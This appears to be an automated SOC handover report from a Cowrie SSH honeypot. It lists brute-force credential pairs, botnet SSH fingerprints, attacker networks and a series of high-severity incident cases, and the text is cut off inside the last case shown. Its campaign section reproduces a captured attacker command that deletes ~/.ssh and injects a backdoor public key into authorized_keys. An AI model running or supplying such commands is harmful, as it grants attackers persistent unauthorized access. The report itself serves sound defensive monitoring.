# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-22 |
| **Generated At** | 2026-07-22T23:10:26Z |
| **Shift Time** | 23:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **134** |
| Confirmed Threats | **114** |
| False Positives Filtered | **20** (14.9%) |
| Unique Attacker IPs | **95** |
| Countries of Origin | **24** |
| High Severity Cases | **70** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **64** |
| Malware Samples Analyzed | **2** HIGH · **32** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **101** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **20** |
| Unique Passwords | **33** |
| Successful Auth Pairs | **85** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 17 |
| `admin` | 12 |
| `debian` | 11 |
| `guest` | 9 |
| `user` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 6 |
| `qwerty123` | 6 |
| `888888` | 6 |
| `444444` | 5 |
| `user111` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 6 |
| `debian` | `888888` | 6 |
| `debian` | `444444` | 5 |
| `user` | `user111` | 5 |
| `guest` | `guest2023` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-22T20:55:45 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-22T20:55:45 |
| `oracle` | `p@ssw0rd` | `65.20.138.46` | 2026-07-22T21:05:05 |
| `oracle` | `p@ssw0rd` | `213.230.65.53` | 2026-07-22T21:05:16 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `185.226.196.12` | 2026-07-22T21:06:03 |
| `oracle` | `p@ssw0rd` | `187.8.120.90` | 2026-07-22T21:08:24 |
| `blank` | `blank11` | `182.75.197.174` | 2026-07-22T21:08:27 |
| `guest` | `guest2014` | `65.20.179.251` | 2026-07-22T21:08:30 |
| `blank` | `blank11` | `10.0.0.73` | 2026-07-22T21:08:54 |
| `guest` | `guest2014` | `92.126.223.175` | 2026-07-22T21:11:36 |
| `guest` | `guest2014` | `10.0.0.73` | 2026-07-22T21:11:59 |
| `admin` | `admin` | `116.62.163.56` | 2026-07-22T21:12:15 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-22T21:12:16 |
| `config` | `0000` | `83.166.50.15` | 2026-07-22T21:13:47 |
| `config` | `0000` | `114.30.223.119` | 2026-07-22T21:13:55 |
| `support` | `support` | `176.53.159.196` | 2026-07-22T21:23:02 |
| `support` | `support` | `10.0.0.73` | 2026-07-22T21:24:20 |
| `pi` | `qwerty123` | `61.12.84.172` | 2026-07-22T21:29:26 |
| `debian` | `888888` | `93.241.232.14` | 2026-07-22T21:29:34 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-22T21:29:38 |
| `debian` | `888888` | `62.122.195.14` | 2026-07-22T21:29:41 |
| `debian` | `888888` | `112.196.52.107` | 2026-07-22T21:32:48 |
| `debian` | `888888` | `182.75.197.174` | 2026-07-22T21:32:56 |
| `pi` | `qwerty123` | `10.0.0.73` | 2026-07-22T21:33:03 |
| `debian` | `888888` | `10.0.0.73` | 2026-07-22T21:33:10 |
| `root` | `qwe123..` | `10.0.0.73` | 2026-07-22T21:33:41 |
| `unknown` | `unknown2010` | `211.247.127.250` | 2026-07-22T21:34:34 |
| `unknown` | `unknown2010` | `178.178.194.123` | 2026-07-22T21:34:42 |
| `unknown` | `unknown2010` | `10.0.0.73` | 2026-07-22T21:34:56 |
| `root` | `qwe123..` | `185.242.3.195` | 2026-07-22T21:35:03 |
| `debian` | `444444` | `111.193.181.226` | 2026-07-22T21:38:12 |
| `debian` | `444444` | `49.124.150.248` | 2026-07-22T21:38:25 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-22T21:38:40 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-22T21:38:41 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-22T21:38:43 |
| `debian` | `444444` | `85.159.164.28` | 2026-07-22T21:41:40 |
| `debian` | `444444` | `10.0.0.73` | 2026-07-22T21:41:51 |
| `root` | `qQ123456` | `185.242.3.195` | 2026-07-22T21:42:27 |
| `admin` | `admin` | `12.125.34.242` | 2026-07-22T21:45:46 |
| `Test` | `qwerty123` | `61.143.227.17` | 2026-07-22T21:53:30 |
| `test` | `222` | `101.13.5.26` | 2026-07-22T21:53:49 |
| `test` | `222` | `211.178.165.251` | 2026-07-22T21:54:02 |
| `user` | `user2020` | `222.92.61.242` | 2026-07-22T21:54:24 |
| `user` | `user2020` | `124.67.120.106` | 2026-07-22T21:54:38 |
| `Test` | `qwerty123` | `177.174.89.99` | 2026-07-22T21:56:54 |
| `Test` | `qwerty123` | `218.202.143.68` | 2026-07-22T21:57:03 |
| `user` | `user2020` | `218.70.9.114` | 2026-07-22T21:57:30 |
| `user` | `user2020` | `10.0.0.73` | 2026-07-22T21:57:55 |
| `config` | `config333` | `111.70.10.15` | 2026-07-22T22:02:17 |
| `dan` | `changeme` | `165.154.254.143` | 2026-07-22T22:04:10 |
| `345gs5662d34` | `345gs5662d34` | `165.154.254.143` | 2026-07-22T22:04:12 |
| `dan` | `3245gs5662d34` | `165.154.254.143` | 2026-07-22T22:04:12 |
| `config` | `config333` | `220.128.137.164` | 2026-07-22T22:05:43 |
| `config` | `config333` | `10.0.0.73` | 2026-07-22T22:06:01 |
| `admin` | `admin2012` | `60.166.8.174` | 2026-07-22T22:17:19 |
| `admin` | `admin2012` | `183.167.234.154` | 2026-07-22T22:17:32 |
| `ubnt` | `55` | `136.185.6.181` | 2026-07-22T22:17:53 |
| `nobody` | `2222222` | `87.225.108.138` | 2026-07-22T22:18:00 |
| `ubnt` | `55` | `201.28.237.90` | 2026-07-22T22:18:01 |
| `nobody` | `2222222` | `217.150.37.249` | 2026-07-22T22:18:13 |
| `admin` | `admin2012` | `10.0.0.73` | 2026-07-22T22:20:38 |
| `nobody` | `2222222` | `178.178.222.52` | 2026-07-22T22:21:14 |
| `ubnt` | `55` | `10.0.0.73` | 2026-07-22T22:21:49 |
| `root` | `qQ123456` | `10.0.0.73` | 2026-07-22T22:25:45 |
| `user` | `user111` | `171.217.70.151` | 2026-07-22T22:26:39 |
| `user` | `user111` | `58.215.243.6` | 2026-07-22T22:26:48 |
| `user` | `user111` | `183.223.156.154` | 2026-07-22T22:30:03 |
| `admin` | `root@123` | `98.71.8.129` | 2026-07-22T22:30:08 |
| `345gs5662d34` | `345gs5662d34` | `98.71.8.129` | 2026-07-22T22:30:14 |
| `admin` | `3245gs5662d34` | `98.71.8.129` | 2026-07-22T22:30:18 |
| `user` | `user111` | `10.0.0.73` | 2026-07-22T22:30:25 |
| `ubuntu` | `!Q2w3e4r` | `185.242.3.195` | 2026-07-22T22:34:22 |
| `guest` | `guest2023` | `14.49.197.174` | 2026-07-22T22:40:03 |
| `guest` | `guest2023` | `27.107.102.154` | 2026-07-22T22:40:15 |
| `root` | `666666` | `210.13.99.66` | 2026-07-22T22:42:15 |
| `root` | `666666` | `103.31.38.92` | 2026-07-22T22:42:25 |
| `guest` | `guest2023` | `96.1.40.151` | 2026-07-22T22:43:15 |
| `guest` | `guest2023` | `10.0.0.73` | 2026-07-22T22:43:33 |
| `administrator` | `P@ssword` | `39.164.91.67` | 2026-07-22T22:45:20 |
| `root` | `666666` | `220.93.167.144` | 2026-07-22T22:45:36 |
| `administrator` | `P@ssword` | `10.0.0.73` | 2026-07-22T22:45:44 |
| `root` | `666666` | `10.0.0.73` | 2026-07-22T22:45:57 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-22T22:47:48 |
| `pi` | `marketing` | `39.164.94.190` | 2026-07-22T22:50:58 |
| `pi` | `marketing` | `85.105.255.56` | 2026-07-22T22:54:13 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **134** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 49 |
| libssh | 14 |
| Go SSH scanner | 11 |
| Paramiko (Python) | 8 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 49 | 47 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `16443846184e...` | Generic scanner | 4 | 1 |
| `19532158b559...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 49 | 47 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 4 | 1 | Generic scanner |
| `19532158b559...` | libssh | 2 | 2 | Mirai/variant |
| `5f904648ee89...` | Go SSH scanner | 2 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.254.143`, `98.71.8.129`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **95** |
| Unique ASNs | **55** |
| High-Risk ASNs | **50** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 10 | HIGH |
| `AS22773` | Cox Communications Inc. | 8 | MEDIUM |
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS21859` | Zenlayer Inc | 4 | HIGH |
| `AS12389` | PJSC Rostelecom | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (70)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b63331580c02

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-22 20:55 |
| **Last Seen** | 2026-07-22 20:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:55:44` | `cowrie.session.connect` |
| `2026-07-22 20:55:44` | `cowrie.client.version` |
| `2026-07-22 20:55:44` | `cowrie.client.kex` |
| `2026-07-22 20:55:45` | `cowrie.login.success` |
| `2026-07-22 20:55:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab670e6519f9

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-22 20:55 |
| **Last Seen** | 2026-07-22 20:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:55:44` | `cowrie.session.connect` |
| `2026-07-22 20:55:44` | `cowrie.client.version` |
| `2026-07-22 20:55:45` | `cowrie.client.kex` |
| `2026-07-22 20:55:45` | `cowrie.login.success` |
| `2026-07-22 20:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ca25a003c38

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]46` |
| **First Seen** | 2026-07-22 21:05 |
| **Last Seen** | 2026-07-22 21:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:05:03` | `cowrie.session.connect` |
| `2026-07-22 21:05:03` | `cowrie.client.version` |
| `2026-07-22 21:05:03` | `cowrie.client.kex` |
| `2026-07-22 21:05:05` | `cowrie.login.success` |
| `2026-07-22 21:05:06` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]46` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a8cefa16d6a

| Field | Detail |
|---|---|
| **Source IP** | `213.230.65[.]53` |
| **First Seen** | 2026-07-22 21:05 |
| **Last Seen** | 2026-07-22 21:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:05:14` | `cowrie.session.connect` |
| `2026-07-22 21:05:15` | `cowrie.client.version` |
| `2026-07-22 21:05:15` | `cowrie.client.kex` |
| `2026-07-22 21:05:16` | `cowrie.login.success` |
| `2026-07-22 21:05:16` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.65[.]53` to AbuseIPDB if not already reported
- [ ] Block `213.230.65[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-244bf187e11c

| Field | Detail |
|---|---|
| **Source IP** | `185.226.196[.]12` |
| **First Seen** | 2026-07-22 21:06 |
| **Last Seen** | 2026-07-22 21:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:06:03` | `cowrie.session.connect` |
| `2026-07-22 21:06:03` | `cowrie.login.success` |
| `2026-07-22 21:06:03` | `cowrie.session.params` |
| `2026-07-22 21:06:03` | `cowrie.command.input` |
| `2026-07-22 21:06:03` | `cowrie.command.input` |
| `2026-07-22 21:06:03` | `cowrie.command.failed` |
| `2026-07-22 21:06:03` | `cowrie.command.input` |
| `2026-07-22 21:06:03` | `cowrie.command.failed` |
| `2026-07-22 21:06:03` | `cowrie.command.input` |
| `2026-07-22 21:06:04` | `cowrie.log.closed` |
| `2026-07-22 21:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.226.196[.]12` to AbuseIPDB if not already reported
- [ ] Block `185.226.196[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e3ac9951c44

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-22 21:08 |
| **Last Seen** | 2026-07-22 21:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:08:22` | `cowrie.session.connect` |
| `2026-07-22 21:08:22` | `cowrie.client.version` |
| `2026-07-22 21:08:22` | `cowrie.client.kex` |
| `2026-07-22 21:08:24` | `cowrie.login.success` |
| `2026-07-22 21:08:25` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:08:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-332dbb5d8806

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-22 21:08 |
| **Last Seen** | 2026-07-22 21:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:08:24` | `cowrie.session.connect` |
| `2026-07-22 21:08:25` | `cowrie.client.version` |
| `2026-07-22 21:08:25` | `cowrie.client.kex` |
| `2026-07-22 21:08:27` | `cowrie.login.success` |
| `2026-07-22 21:08:27` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dc2abda5c0b

| Field | Detail |
|---|---|
| **Source IP** | `65.20.179[.]251` |
| **First Seen** | 2026-07-22 21:08 |
| **Last Seen** | 2026-07-22 21:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:08:28` | `cowrie.session.connect` |
| `2026-07-22 21:08:29` | `cowrie.client.version` |
| `2026-07-22 21:08:29` | `cowrie.client.kex` |
| `2026-07-22 21:08:30` | `cowrie.login.success` |
| `2026-07-22 21:08:31` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.179[.]251` to AbuseIPDB if not already reported
- [ ] Block `65.20.179[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f4838164dba

| Field | Detail |
|---|---|
| **Source IP** | `92.126.223[.]175` |
| **First Seen** | 2026-07-22 21:11 |
| **Last Seen** | 2026-07-22 21:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:11:34` | `cowrie.session.connect` |
| `2026-07-22 21:11:34` | `cowrie.client.version` |
| `2026-07-22 21:11:34` | `cowrie.client.kex` |
| `2026-07-22 21:11:36` | `cowrie.login.success` |
| `2026-07-22 21:11:36` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:11:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.126.223[.]175` to AbuseIPDB if not already reported
- [ ] Block `92.126.223[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-110317872085

| Field | Detail |
|---|---|
| **Source IP** | `116.62.163[.]56` |
| **First Seen** | 2026-07-22 21:12 |
| **Last Seen** | 2026-07-22 21:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:12:12` | `cowrie.session.connect` |
| `2026-07-22 21:12:12` | `cowrie.client.version` |
| `2026-07-22 21:12:12` | `cowrie.client.kex` |
| `2026-07-22 21:12:15` | `cowrie.login.success` |
| `2026-07-22 21:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.62.163[.]56` to AbuseIPDB if not already reported
- [ ] Block `116.62.163[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd45949ef4d9

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-22 21:12 |
| **Last Seen** | 2026-07-22 21:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:12:15` | `cowrie.session.connect` |
| `2026-07-22 21:12:15` | `cowrie.client.version` |
| `2026-07-22 21:12:16` | `cowrie.client.kex` |
| `2026-07-22 21:12:16` | `cowrie.login.success` |
| `2026-07-22 21:12:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-623cad2b0b37

| Field | Detail |
|---|---|
| **Source IP** | `83.166.50[.]15` |
| **First Seen** | 2026-07-22 21:13 |
| **Last Seen** | 2026-07-22 21:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:13:46` | `cowrie.session.connect` |
| `2026-07-22 21:13:46` | `cowrie.client.version` |
| `2026-07-22 21:13:46` | `cowrie.client.kex` |
| `2026-07-22 21:13:47` | `cowrie.login.success` |
| `2026-07-22 21:13:48` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.166.50[.]15` to AbuseIPDB if not already reported
- [ ] Block `83.166.50[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7db25099c16

| Field | Detail |
|---|---|
| **Source IP** | `114.30.223[.]119` |
| **First Seen** | 2026-07-22 21:13 |
| **Last Seen** | 2026-07-22 21:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:13:53` | `cowrie.session.connect` |
| `2026-07-22 21:13:53` | `cowrie.client.version` |
| `2026-07-22 21:13:53` | `cowrie.client.kex` |
| `2026-07-22 21:13:55` | `cowrie.login.success` |
| `2026-07-22 21:13:56` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:14:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.223[.]119` to AbuseIPDB if not already reported
- [ ] Block `114.30.223[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e39a2de6915c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-22 21:23 |
| **Last Seen** | 2026-07-22 21:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:23:02` | `cowrie.session.connect` |
| `2026-07-22 21:23:02` | `cowrie.client.version` |
| `2026-07-22 21:23:02` | `cowrie.client.kex` |
| `2026-07-22 21:23:02` | `cowrie.login.success` |
| `2026-07-22 21:23:03` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:23:03` | `cowrie.direct-tcpip.data` |
| `2026-07-22 21:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cb52ef5b7db

| Field | Detail |
|---|---|
| **Source IP** | `61.12.84[.]172` |
| **First Seen** | 2026-07-22 21:29 |
| **Last Seen** | 2026-07-22 21:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:29:24` | `cowrie.session.connect` |
| `2026-07-22 21:29:24` | `cowrie.client.version` |
| `2026-07-22 21:29:24` | `cowrie.client.kex` |
| `2026-07-22 21:29:26` | `cowrie.login.success` |
| `2026-07-22 21:29:27` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.84[.]172` to AbuseIPDB if not already reported
- [ ] Block `61.12.84[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9561d09ef45a

| Field | Detail |
|---|---|
| **Source IP** | `93.241.232[.]14` |
| **First Seen** | 2026-07-22 21:29 |
| **Last Seen** | 2026-07-22 21:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:29:33` | `cowrie.session.connect` |
| `2026-07-22 21:29:33` | `cowrie.client.version` |
| `2026-07-22 21:29:33` | `cowrie.client.kex` |
| `2026-07-22 21:29:34` | `cowrie.login.success` |
| `2026-07-22 21:29:34` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.241.232[.]14` to AbuseIPDB if not already reported
